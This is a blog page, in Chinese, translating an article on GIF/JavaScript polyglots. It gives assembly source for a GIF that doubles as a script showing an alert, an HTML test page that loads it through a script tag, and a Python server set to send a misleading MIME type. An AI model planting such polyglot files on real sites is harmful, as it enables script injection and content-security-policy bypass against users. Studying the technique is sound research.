@@ -1,0 +1,453 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN/����">
+<head>
+  <meta charset="UTF-8">
+  <meta name="baidu_union_verify" content="d1952c66cf48912e21c18c7c581f382a">
+  <meta name="360-site-verification" content="67fbcc5a67f4c65c057315b28fa0b2c8" />
+<meta name="google-site-verification" content="2GzxQ0VtXwTSUdmGm6DzcmhTzM_I9QmzCb_pzpMzD88" />
+  
+    <title>GIF/Javascript Polyglots :滥用GIF、tag和MIME类型成灾 | 0aspir1ng0 Paradise</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="0aspir1ng0">
+    
+    <meta name="description" content="本文是《GIF/Javascript Polyglots: Abusing GIFs, tags and MIME types for evil》的翻译文章
+前言最近，我注意到个正在接管的项目的一个功能，这个功能就是它允许热连接到任意gif图片上并且不用通过把gif导入、修改、保存下来就可以实现为我">
+    
+    
+    
+    
+    <link rel="alternate" href="atom.xml" title="0aspir1ng0 Paradise" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/logo2.ico">
+    
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            var _bdId ='391982416296a0d54221f59fe35250d4';
+             hm.src = "//hm.baidu.com/hm.js?" + _bdId;
+             var s = document.getElementsByTagName("script")[0]; 
+             s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+     
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="0aspir1ng0 Paradise">0aspir1ng0 Paradise</a></h1>
+				<a class="blog-motto">Here is where you are. Nothing is impossible.</a>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/tech">Techology</a></li>
+					
+						<li><a href="/life">Life</a></li>
+					
+						<li><a href="/others">Others</a></li>
+					
+						<li><a href="/About-Me">About-Me</a></li>
+					
+					<li>
+					
+                                            <form class="search" action=http://zhannei.baidu.com/cse/search target="_blank">
+                                            <label>Search</label>
+                                        <input name="s" type="hidden" value=  ><input type="text" name="q" size="30" placeholder="Search"><br>
+					
+					</li>
+				</ul>
+                            </nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/11/24/GIFJavascript Polyglot 滥用GIF、tag和MIME类型成灾/" title="GIF/Javascript Polyglots :滥用GIF、tag和MIME类型成灾" itemprop="url">GIF/Javascript Polyglots :滥用GIF、tag和MIME类型成灾</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://aiapple97.github.io" title="0aspir1ng0">0aspir1ng0</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2018-11-24T05:06:30.000Z" itemprop="datePublished">2018-11-24</time>
+    Updated:<time datetime="2018-11-24T05:12:55.774Z" itemprop="dateModified">2018-11-24</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞挖掘"><span class="toc-number">2.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞演示"><span class="toc-number">3.</span> <span class="toc-text">漏洞演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞恶意代码执行与EXP"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞恶意代码执行与EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">4.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">5.</span> <span class="toc-text">参考文献</span></a></li></ol>
+		</div>
+		
+		<p>本文是《<a href="https://0x00sec.org/t/gif-javascript-polyglots-abusing-gifs-tags-and-mime-types-for-evil/5088" target="_blank" rel="external">GIF/Javascript Polyglots: Abusing GIFs, tags and MIME types for evil</a>》的翻译文章</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近，我注意到个正在接管的项目的一个功能，这个功能就是它允许热连接到任意gif图片上并且不用通过把gif导入、修改、保存下来就可以实现为我们所用的目的。既然这个功能如此方便，我猜，它可能并不安全，于是马上就想利用它找些可以导致漏洞方法来测试。最简单也是最明显的方法就是先链接到一张普通图片上，过一会再换成另外一个看上去更平淡无奇的图片。这简直是小儿科哈，是不是？那我们就来搞点事情。这里先剧透下：我确实真的搞事了，但是没想到会搞得那么大动静以至于让它变得“大规模杀伤化”了。</p>
+<p>在证明了我可以很容易地从我控制的服务器上交换图像之后，我开始寻找能将可执行文件嵌入到图片中的办法，于是偶然间，我发现了利用polyglots达到目的的方法。关于这点中的polyglot，它是一段允许两种或两种语言以上显示的代码。本文的测试用例中，我们用到的是gif/javascript polyglot。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>像往常一样，我一般先去Google上搜下看有没有什么相关结果，或者上IRC问问。我有种预感，之前肯定有人做过这样的测试，所以我就去找相关论文或博文、帖子或者任何引导我发现这方面知识点的文章，很快，我就找到了一些既阐述了攻击原理又讲解了如何构造恶意gif文件的资源。</p>
+<p>整个攻击里面最基础部分的实现思路就是用汇编语言写个自动创建gif文件的程序，在gif中填入需要的文件头和文件域信息。通过将宽度设置为10799，这个值原本在ASCII中是个无效码，但是当gif被解析成脚本文件的时候，它被转换后解析成‘/*’ASCII码，也就是javascript注释的开头。当gif被解析成img文件时，浏览器只是将图片渲染的很宽。gif文件内容和文件域就包含在js注释的开头和结尾之间，同时注释在gif文件末尾处就闭合了；而用同样的思路，把要执行的js代码添加到gif文件末尾，这样就可以在gif被解析成脚本的时候执行代码了。下面是我写的自动生成这样的gif代码：（不过本文中参考文献部分，我放了个这个代码的下载链接。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">; a hand-made GIF containing valid JavaScript code</div><div class="line">; abusing header to start a JavaScript comment</div><div class="line">; inspired by Saumil Shah&apos;s Deadly Pixels presentation</div><div class="line">; Ange Albertini, BSD Licence 2013</div><div class="line">; yamal gifjs.asm -o img.gif</div><div class="line"></div><div class="line">WIDTH equ 10799 ; equivalent to 2f2a, which is &apos;/*&apos; in ASCII, thus starting an opening comment</div><div class="line">HEIGTH equ 100 ; just to make it easier to spot</div><div class="line">db &apos;GIF89a&apos;</div><div class="line">    dw WIDTH, HEIGTH</div><div class="line">db 0 ; GCT</div><div class="line">    db -1 ;  background color</div><div class="line">    db 0 ; default aspect ratio</div><div class="line">    ;db 0fch, 0feh, 0fch</div><div class="line">    ;times COLORS db 0, 0, 0</div><div class="line">; no need of Graphic Control Extension</div><div class="line"> ; db 21h, 0f9h</div><div class="line"> ; db GCESIZE ; size</div><div class="line"> ; gce_start:</div><div class="line"> ;     db 0 ; transparent background</div><div class="line"> ;     dw 0 ; delay for anim</div><div class="line"> ;     db 0 ; other transparent</div><div class="line"> ; GCESIZE equ $ - gce_start</div><div class="line"> ;     db 0 ; end of GCE</div><div class="line">db 02ch ; Image descriptor</div><div class="line">    dw 0, 0 ; NW corner</div><div class="line">    dw WIDTH, HEIGTH ; w/h of image</div><div class="line">    db 0    ; color table</div><div class="line">db 2 ; lzw size</div><div class="line">;db DATASIZE</div><div class="line">;data_start:</div><div class="line">;    db 00, 01, 04, 04</div><div class="line">;    DATASIZE equ $ - data_start</div><div class="line">db 0</div><div class="line">db 3bh ; GIF terminator</div><div class="line">; end of the GIF</div><div class="line">db &apos;*/&apos;  ; closing the comment</div><div class="line">db &apos;=1;&apos; ; creating a fake use of that GIF89a string</div><div class="line">db &apos;alert(&quot;haxx&quot;);&apos;</div></pre></td></tr></table></figure>
+<p>正如你所看到的，我们在文件末尾就闭合了代码注释、加入了自己的js代码。gif被解析成脚本的时候，解析器会跳过所有和gif相关的部分，仅仅会文件尾处排查下js。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>由于当时我脑袋短路了，再加上对产品操作手册上的错误理解，这导致我错误地认为手册上推荐的编译器yasm只能运行在windows上。我把代码丢到yasm编译器和c++编译器上分别运行了很久却还是不能运行，这时候我才发现我居然可以直接取源码然后放在自己主机里面运行！这简直太好了！于是现在要运行编译这段代码就是小菜一碟了:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ yasm ./gifjs.asm -o img.gif</div></pre></td></tr></table></figure>
+<h3 id="漏洞恶意代码执行与EXP"><a href="#漏洞恶意代码执行与EXP" class="headerlink" title="漏洞恶意代码执行与EXP"></a>漏洞恶意代码执行与EXP</h3><p>然而不幸地是，写到这个部分，整个事情就发展得让人感到有些悲哀了。为了让它真正发挥出作用，我不得不让代码在某种人为介入的情况下运行，虽然实际上这种可能微乎其微，可是实际情况中也不太可能这么发生（在我看来是这样的），也正因如此，代码要执行的话就要有下面的两条先决条件:</p>
+<ol>
+<li>GIF文件必须用<code>&lt;script&gt;</code>标记后再解析，而不是用<code>&lt;img&gt;</code>标记。</li>
+<li>必须送误导性的MIME类型。</li>
+</ol>
+<p>由此，这两个条件意味着你不大可能在未授权或未受控制的服务器上找得到可以利用的部分，所以最好使用手头上已经控制的服务器，设置上述exp环境条件。</p>
+<p>为了执行代码，我写了如下的一小段HTML代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">This is a test</div><div class="line">&lt;img src=&quot;img.gif&quot;&gt;</div><div class="line">&lt;script src=&quot;img.gif&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>从上可知，上述代码只能可以测试下是否有这个漏洞：将嵌入恶意代码的gif文件解析后显示为图像，然后再将其作为脚本显示。如果你打开浏览器时，界面跳转到本地文件系统中对应的文件去（比如，这里是<code>/tmp/test.html</code>），gif就会弹出警告窗口。这样看来是不是就有点意思了？</p>
+<p>现在尝试把它上传到图像托管网站，比如Imgur，从网站上链接出去，你就会发现些有趣的事情了。但是又可能什么也不会出现。如果你尝试运行在HTML之上，但直接把链接到imgur的<code>.gif</code>文件上，浏览器的控制台上可能会报错，报错内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Refused to execute script from &apos;https://i.imgur.com/IXGn93f.gif&apos; because its MIME type (&apos;image/gif&apos;) is not executable.</div></pre></td></tr></table></figure>
+<p>那么看到这里，问题回来了，什么是MIME类型呢？</p>
+<p>MIME类型实际上并不比拥有可传参数据的内部属性的标签更加复杂，这些标签通过属性上的数据传输来告诉接收端它接收到的是什么样类型的数据。这使得客户端明白它将如何处理这些数据，告诉客户端，“这只是一个标签而已，而且它是可信任基础上创建的”。既然可信任，而人们通常利用可信任的一系列事务搞事情。</p>
+<p>我们回到要说的第2点：发送一种误导性的MIME类型来说服浏览器执行你的文件。我们已经知道Imgur不会允许我们这么做，可是我们怎么绕过它实现呢？就我而言，我写了段简单的python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> SimpleHTTPServer</div><div class="line"><span class="keyword">import</span> SocketServer</div><div class="line">PORT = <span class="number">8000</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span><span class="params">(SimpleHTTPServer.SimpleHTTPRequestHandler)</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="comment">#.gif扩展</span></div><div class="line">Handler.extensions_map[<span class="string">'.gif'</span>] = <span class="string">'application/octet-stream'</span></div><div class="line">httpd = SocketServer.TCPServer((<span class="string">""</span>, PORT), Handler)</div><div class="line"><span class="keyword">print</span> <span class="string">"serving at port"</span>, PORT</div><div class="line">httpd.serve_forever()</div></pre></td></tr></table></figure>
+<p>上述代码用了SimpleHTTPServer（Python标准库中有）获取并提供本地目录下的文件目录。默认情况下，SimpleHTTPServer会尝试根据使用的扩展来提供相应且恰当的MIME类型，所以这里我们要稍微修改下让它：把<code>.gif</code>的扩展解析成浏览器会执行的<code>application/octect-stream/</code>格式。如果我给该html文件命名为<code>index.html</code>，我就可以通过点击<code>http://127.0.0.1:8000/index.html</code>来获取用浏览器可执行的MIME类型构造出恶意gif文件的服务响应。结果嘛肯定是，我们成功地把js加入到成gif里了。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>总体上说，它并不是一种新出现的或者是新奇的攻击方式，而且我也不认为这个漏洞将会广为流传。但是这个方法相当的有技巧性，暴露了几个因此会导致漏洞的可信任方面。</p>
+<p>本篇文章主要的要点总结列举如下：</p>
+<ol>
+<li>浏览器确定文件类型时<em>基本上不会根据之前对此文件的类型记录，判定当前文件的类型</em> *。充其量，他们会查看扩展和魔术字节来尝试确认下该文件是否为它所声称的文件类型。</li>
+<li>因为提供的是gif文件和JS代码块的有效位，所以浏览器要用以前的记录判定类型，对之前文件信息的记录要比现在记录的详细的多，提供更多的信息才行。</li>
+<li>浏览器也许有点过于信任MIME类型了。</li>
+<li>此攻击漏洞很容易就被利用了，并且很难从你所掌控的站点上检测出来，因为用户无法查看正在运行的js。这之后他们也许会看到某个<code>.js</code>的文件正在执行，可是并不能获取到文件，查看文件的内容。因此，这种方法的混淆程度已经达到了3/10。</li>
+</ol>
+<p>* <em>译者注：原文直译为”浏览器确认文件类型时候对实际启发式法（actual heuristics）没有太大作用“，根据实际启发式法的含义为”基于之前的经验去对新事物进行探测“的含义，这里将其含义指扩展翻译出来。</em></p>
+<p>总之，这次挖掘的漏洞有意思，挖掘地很开心，而且用起来还简单方便~。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot" target="_blank" rel="external">https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot</a></p>
+<p><a href="https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm" target="_blank" rel="external">https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm</a></p>
+<p><a href="http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html" target="_blank" rel="external">http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://aiapple97.github.io/2018/11/24/GIFJavascript Polyglot 滥用GIF、tag和MIME类型成灾/" data-title="GIF/Javascript Polyglots :滥用GIF、tag和MIME类型成灾 | 0aspir1ng0 Paradise" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/11/08/DVWA 之小白学习NOTES--暴力破解/"  title="DVWA 之小白学习NOTES--暴力破解">
+ <strong>NEXT:</strong><br/> 
+ <span>DVWA 之小白学习NOTES--暴力破解
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	
+	<div class="ds-thread" data-title="GIF/Javascript Polyglots :滥用GIF、tag和MIME类型成灾" data-thread-key="GIFJavascript Polyglot 滥用GIF、tag和MIME类型成灾" data-author-key="0aspir1ng0" data-url="http://aiapple97.github.io/post/GIFJavascript Polyglot 滥用GIF、tag和MIME类型成灾"></div>
+	
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞挖掘"><span class="toc-number">2.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞演示"><span class="toc-number">3.</span> <span class="toc-text">漏洞演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞恶意代码执行与EXP"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞恶意代码执行与EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">4.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">5.</span> <span class="toc-text">参考文献</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-logo"></div>		
+	
+	<div class="social-list" class="clearfix">
+		
+		
+		
+		<a href="https://github.com/aiapple97" target="_blank" title="github"></a>
+		
+		
+		
+		<a href="https://zhihu.com/people/cristal-57" target="_blank" title="zhihu"></a>
+		
+	</div>
+</div>
+
+  
+
+  
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://aiapple97.github.io" target="_blank" title="Hexo">0aspir1ng0 Paradise</a></li>
+      <li><a href="http://cl0und.github.io/" target="_blank" title="coney">cl0und's blog</a></li>
+      <li><a href="http://eagerseven.cn" target="_blank" title="coney">eagerseven's blog</a></li>
+      <li><a href="http://har01d.me" target="_blank" title="coney">har01d's blog</a></li>
+      <li><a href="https://9955zhangxichen.github.io/" target="_blank" title="coney">9955zhangxichen's blog</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+    
+            <p class="copyright"> © 2018 
+		
+		<a href="http://aiapple97.github.io" target="_blank" title="0aspir1ng0">0aspir1ng0</a>
+		
+            && Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> && Theme by <a href="http://gengbiao.me" target="_blank" title="coney">coney</a>
+            </div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+<script>
+    
+        var _bdImg = '5';
+    
+    window._bd_share_config={
+        "common":{
+            "bdSnsKey":{
+
+            },
+            "bdText":"",
+            "bdMini":"2",
+            "bdMiniList":[
+                "qzone",
+                "tsina",
+                "weixin",
+                "renren",
+                "tqq",
+                "tieba",
+                "douban",
+                "sqq",
+                "diandian",
+                "huaban",
+                "youdao",
+                "mail",
+                "ty",
+                "fbook",
+                "twi",
+                "linkedin",
+                "copy",
+                "print"
+            ],
+            "bdPic":"",
+            "bdStyle":"0",
+            "bdSize":"16"
+        },
+        "slide":{
+            "type":"slide",
+            "bdImg":_bdImg,
+            "bdPos":"right",
+            "bdTop":"350"
+        },
+        "image":{
+            "viewList":[
+                "weixin",
+                "qzone",
+                "tsina",
+                "renren",
+                "douban",
+                "tqq"
+            ],
+            "viewText":"分享：",
+            "viewSize":"16"
+        },
+        "selectShare":{
+            "bdContainerClass":null,
+            "bdSelectMiniList":[
+                "weixin",
+                "qzone",
+                "tsina",
+                "renren",
+                "douban",
+                "tqq"
+            ]
+        }
+    };
+    with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+
+
+
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ga('create', '', '');  
+ga('send', 'pageview');
+</script>
+
+
+  </body>
+</html>
+
